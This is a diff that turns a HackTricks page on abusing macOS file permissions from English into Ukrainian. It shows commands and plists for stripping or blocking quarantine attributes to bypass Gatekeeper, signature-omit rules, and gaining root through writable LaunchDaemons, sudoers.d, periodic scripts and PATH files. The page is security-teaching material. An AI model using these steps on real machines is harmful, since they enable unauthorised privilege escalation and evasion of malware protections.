@@ -2,86 +2,81 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
 
 </details>
 
-## POSIX permissions combinations
+## Комбінації дозволів POSIX
 
-Permissions in a **directory**:
+Дозволи в **каталозі**:
 
-* **read** - you can **enumerate** the directory entries
-* **write** - you can **delete/write** **files** in the directory and you can **delete empty folders**.
-  * But you **cannot delete/modify non-empty folders** unless you have write permissions over it.
-  * You **cannot modify the name of a folder** unless you own it.
-* **execute** - you are **allowed to traverse** the directory - if you don’t have this right, you can’t access any files inside it, or in any subdirectories.
+* **читання** - ви можете **перелічити** записи каталогу
+* **запис** - ви можете **видаляти/записувати** **файли** в каталозі та **видаляти порожні папки**.
+* Але ви **не можете видаляти/змінювати непорожні папки**, якщо у вас немає дозволів на запис до них.
+* Ви **не можете змінювати назву папки**, якщо ви не є її власником.
+* **виконання** - вам **дозволено переходити** в каталог - якщо у вас немає цього права, ви не зможете отримати доступ до будь-яких файлів всередині нього або в будь-яких підкаталогах.
 
-### Dangerous Combinations
+### Небезпечні комбінації
 
-**How to overwrite a file/folder owned by root**, but:
+**Як перезаписати файл/папку, яка належить root**, але:
 
-* One parent **directory owner** in the path is the user
-* One parent **directory owner** in the path is a **users group** with **write access**
-* A users **group** has **write** access to the **file**
+* Один батьківський **власник каталогу** в шляху - користувач
+* Один батьківський **власник каталогу** в шляху - **група користувачів** з **доступом на запис**
+* Група користувачів має **доступ на запис** до **файлу**
 
-With any of the previous combinations, an attacker could **inject** a **sym/hard link** the expected path to obtain a privileged arbitrary write.
+З будь-якою з попередніх комбінацій атакувальник може **впровадити** **символьне/жорстке посилання** на очікуваний шлях, щоб отримати привілейоване довільне записування.
 
-### Folder root R+X Special case
+### Випадок спеціального доступу R+X для кореня каталогу
 
-If there are files in a **directory** where **only root has R+X access**, those are **not accessible to anyone else**. So a vulnerability allowing to **move a file readable by a user**, that cannot be read because of that **restriction**, from this folder **to a different one**, could be abuse to read these files.
+Якщо є файли в **каталозі**, де **тільки root має доступ R+X**, вони **недоступні для будь-кого іншого**. Тому вразливість, яка дозволяє **перемістити файл, доступний для читання користувачем**, який не може читати через це **обмеження**, з цього каталогу **в інший**, може бути використана для читання цих файлів.
 
-Example in: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)
+Приклад у: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)
 
-## Symbolic Link / Hard Link
+## Символьне посилання / Жорстке посилання
 
-If a privileged process is writing data in **file** that could be **controlled** by a **lower privileged user**, or that could be **previously created** by a lower privileged user. The user could just **point it to another file** via a Symbolic or Hard link, and the privileged process will write on that file.
+Якщо привілейований процес записує дані в **файл**, який може бути **контрольований** менш привілейованим користувачем або який може бути **раніше створений** менш привілейованим користувачем. Користувач може просто **вказати на інший файл** через символьне або жорстке посилання, і привілейований процес буде записувати в цей файл.
 
-Check in the other sections where an attacker could **abuse an arbitrary write to escalate privileges**.
+Перевірте інші розділи, де атакувальник може **використовувати довільне записування для підвищення привілеїв**.
 
 ## .fileloc
 
-Files with **`.fileloc`** extension can point to other applications or binaries so when they are open, the application/binary will be the one executed.\
-Example:
-
+Файли з розширенням **`.fileloc`** можуть вказувати на інші програми або бінарні файли, тому коли вони відкриваються, виконуватиметься ця програма/бінарний файл.\
+Приклад:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>URL</key>
-    <string>file:///System/Applications/Calculator.app</string>
-    <key>URLPrefix</key>
-    <integer>0</integer>
+<key>URL</key>
+<string>file:///System/Applications/Calculator.app</string>
+<key>URLPrefix</key>
+<integer>0</integer>
 </dict>
 </plist>
 ```
+## Довільний FD
 
-## Arbitrary FD
+Якщо ви можете змусити **процес відкрити файл або папку з високими привілеями**, ви можете зловживати **`crontab`**, щоб відкрити файл у `/etc/sudoers.d` з **`EDITOR=exploit.py`**, тоді `exploit.py` отримає FD до файлу всередині `/etc/sudoers` і зловживає ним.
 
-If you can make a **process open a file or a folder with high privileges**, you can abuse **`crontab`** to open a file in `/etc/sudoers.d` with **`EDITOR=exploit.py`**, so the `exploit.py` will get the FD to the file inside `/etc/sudoers` and abuse it.
+Наприклад: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
 
-For example: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
+## Уникайте трюків з атрибутами xattrs карантину
 
-## Avoid quarantine xattrs tricks
-
-### Remove it
-
+### Видаліть це
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
+### Прапорець uchg / uchange / uimmutable
 
-### uchg / uchange / uimmutable flag
-
-If a file/folder has this immutable attribute it won't be possible to put an xattr on it
-
+Якщо у файлу/папці встановлено цей незмінний атрибут, то неможливо буде додати до нього xattr.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -91,11 +86,9 @@ xattr: [Errno 1] Operation not permitted: '/tmp/asd'
 ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
+### Монтування defvfs
 
-### defvfs mount
-
-A **devfs** mount **doesn't support xattr**, more info in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
-
+Монтування **devfs** **не підтримує xattr**, додаткова інформація в [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
 ```bash
 mkdir /tmp/mnt
 mount_devfs -o noowners none "/tmp/mnt"
@@ -104,11 +97,9 @@ mkdir /tmp/mnt/lol
 xattr -w com.apple.quarantine "" /tmp/mnt/lol
 xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
 ```
-
 ### writeextattr ACL
 
-This ACL prevents from adding `xattrs` to the file
-
+Цей ACL запобігає додаванню `xattrs` до файлу
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -129,17 +120,15 @@ open test.zip
 sleep 1
 ls -le /tmp/test
 ```
-
 ### **com.apple.acl.text xattr + AppleDouble**
 
-**AppleDouble** file format copies a file including its ACEs.
+Формат файлу **AppleDouble** копіює файл разом з його ACEs.
 
-In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`** is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
+У [**вихідному коді**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) можна побачити, що текстове представлення ACL, збережене всередині xattr під назвою **`com.apple.acl.text`**, буде встановлено як ACL у розпакованому файлі. Таким чином, якщо ви стиснули додаток у zip-файл з форматом файлу **AppleDouble** з ACL, яке перешкоджає запису інших xattr до нього... xattr карантину не було встановлено у додаток:
 
-Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.
+Перевірте [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) для отримання додаткової інформації.
 
-To replicate this we first need to get the correct acl string:
-
+Для реплікації цього спочатку нам потрібно отримати правильний рядок acl:
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -157,78 +146,71 @@ ditto -c -k del test.zip
 ditto -x -k --rsrc test.zip .
 ls -le test
 ```
+(Зверніть увагу, що навіть якщо це працює, після цього пісочниця записує атрибут quarantine)
 
-(Note that even if this works the sandbox write the quarantine xattr before)
-
-Not really needed but I leave it there just in case:
+Не зовсім потрібно, але я залишаю це тут на всякий випадок:
 
 {% content-ref url="macos-xattr-acls-extra-stuff.md" %}
 [macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
 {% endcontent-ref %}
 
-## Bypass Code Signatures
+## Обхід підписів коду
 
-Bundles contains the file **`_CodeSignature/CodeResources`** which contains the **hash** of every single **file** in the **bundle**. Note that the hash of CodeResources is also **embedded in the executable**, so we can't mess with that, either.
+Пакунки містять файл **`_CodeSignature/CodeResources`**, який містить **хеш** кожного окремого **файлу** у **пакунку**. Зверніть увагу, що хеш CodeResources також **вбудований у виконуваний файл**, тому ми не можемо з цим порушувати.
 
-However, there are some files whose signature won't be checked, these have the key omit in the plist, like:
-
+Однак є деякі файли, підпис яких не буде перевірений, вони мають ключ omit у plist, наприклад:
 ```xml
 <dict>
 ...
-	<key>rules</key>
-	<dict>
+<key>rules</key>
+<dict>
 ...
-		<key>^Resources/.*\.lproj/locversion.plist$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>1100</real>
-		</dict>
+<key>^Resources/.*\.lproj/locversion.plist$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>1100</real>
+</dict>
 ...
-	</dict>
-	<key>rules2</key>
+</dict>
+<key>rules2</key>
 ...
-		<key>^(.*/)?\.DS_Store$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>2000</real>
-		</dict>
+<key>^(.*/)?\.DS_Store$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>2000</real>
+</dict>
 ...
-		<key>^PkgInfo$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>20</real>
-		</dict>
+<key>^PkgInfo$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>20</real>
+</dict>
 ...
-		<key>^Resources/.*\.lproj/locversion.plist$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>1100</real>
-		</dict>
+<key>^Resources/.*\.lproj/locversion.plist$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>1100</real>
+</dict>
 ...
 </dict>
 ```
-
-It's possible to calculate the signature of a resource from the cli with:
+Можливо обчислити підпис ресурсу з командного рядка за допомогою:
 
 {% code overflow="wrap" %}
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
-{% endcode %}
+## Монтування dmg-файлів
 
-## Mount dmgs
-
-A user can mount a custom dmg created even on top of some existing folders. This is how you could create a custom dmg package with custom content:
-
-{% code overflow="wrap" %}
+Користувач може монтувати власний dmg-файл, створений навіть поверх деяких існуючих папок. Ось як ви можете створити власний dmg-пакет із власним вмістом:
 ```bash
 # Create the volume
 hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
@@ -247,58 +229,55 @@ hdiutil detach /private/tmp/mnt 1>/dev/null
 # Next time you mount it, it will have the custom content you wrote
 
 # You can also create a dmg from an app using:
-hdiutil create -srcfolder justsome.app justsome.dmg 
+hdiutil create -srcfolder justsome.app justsome.dmg
 ```
 {% endcode %}
 
-Usually macOS mounts disk talking to the `com.apple.DiskArbitrarion.diskarbitrariond` Mach service (provided by `/usr/libexec/diskarbitrationd`). If adding the param `-d` to the LaunchDaemons plist file and restarted, it will store logs it will store logs in `/var/log/diskarbitrationd.log`.\
-However, it's possible to use tools like `hdik` and `hdiutil` to communicate directly with the `com.apple.driver.DiskImages` kext.
+Зазвичай macOS монтує диск, спілкуючись з службою Mach `com.apple.DiskArbitrarion.diskarbitrariond` (наданою `/usr/libexec/diskarbitrationd`). Якщо додати параметр `-d` до файлу LaunchDaemons plist та перезапустити його, він буде зберігати журнали в `/var/log/diskarbitrationd.log`.\
+Однак можна використовувати інструменти, такі як `hdik` та `hdiutil`, щоб спілкуватися безпосередньо з `com.apple.driver.DiskImages` kext.
 
-## Arbitrary Writes
+## Довільні записи
 
-### Periodic sh scripts
+### Періодичні sh-сценарії
 
-If your script could be interpreted as a **shell script** you could overwrite the **`/etc/periodic/daily/999.local`** shell script that will be triggered every day.
+Якщо ваш сценарій можна розглядати як **shell-сценарій**, ви можете перезаписати **`/etc/periodic/daily/999.local`** shell-сценарій, який буде запускатися щодня.
 
-You can **fake** an execution of this script with: **`sudo periodic daily`**
+Ви можете **підробити** виконання цього сценарію за допомогою: **`sudo periodic daily`**
 
-### Daemons
+### Демони
 
-Write an arbitrary **LaunchDaemon** like **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** with a plist executing an arbitrary script like:
-
+Запишіть довільний **LaunchDaemon**, наприклад **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** з plist, що виконує довільний сценарій, наприклад:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
-    <dict>
-        <key>Label</key>
-        <string>com.sample.Load</string>
-        <key>ProgramArguments</key>
-        <array>
-            <string>/Applications/Scripts/privesc.sh</string>
-        </array>
-        <key>RunAtLoad</key>
-        <true/>
-    </dict>
+<dict>
+<key>Label</key>
+<string>com.sample.Load</string>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Scripts/privesc.sh</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
+</dict>
 </plist>
 ```
+Просто створіть сценарій `/Applications/Scripts/privesc.sh` з **командами**, які ви хочете виконати як root.
 
-Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
+### Файл Sudoers
 
-### Sudoers File
+Якщо у вас є **довільна можливість запису**, ви можете створити файл всередині папки **`/etc/sudoers.d/`**, що надасть вам **sudo** привілеї.
 
-If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
+### Файли шляхів
 
-### PATH files
+Файл **`/etc/paths`** є одним з основних місць, які заповнюють змінну середовища PATH. Вам потрібно мати права root для його перезапису, але якщо сценарій з **привілейованим процесом** виконує деяку **команду без повного шляху**, ви можете **перехопити** його, змінивши цей файл.
 
-The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.
+Ви також можете записувати файли в **`/etc/paths.d`**, щоб завантажувати нові теки в змінну середовища `PATH`.
 
-You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.
+## Створення записуваних файлів від інших користувачів
 
-## Generate writable files as other users
-
-This will generate a file that belongs to root that is writable by me ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). This might also work as privesc:
-
+Це створить файл, який належить користувачу root і доступний для запису мені ([**код звідси**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Це також може працювати як підвищення привілеїв:
 ```bash
 DIRNAME=/usr/local/etc/periodic/daily
 
@@ -310,21 +289,20 @@ MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDont
 FILENAME=$(ls "$DIRNAME")
 echo $FILENAME
 ```
-
-## References
+## Посилання
 
 * [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний мерч PEASS & HackTricks**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.
 
 </details>
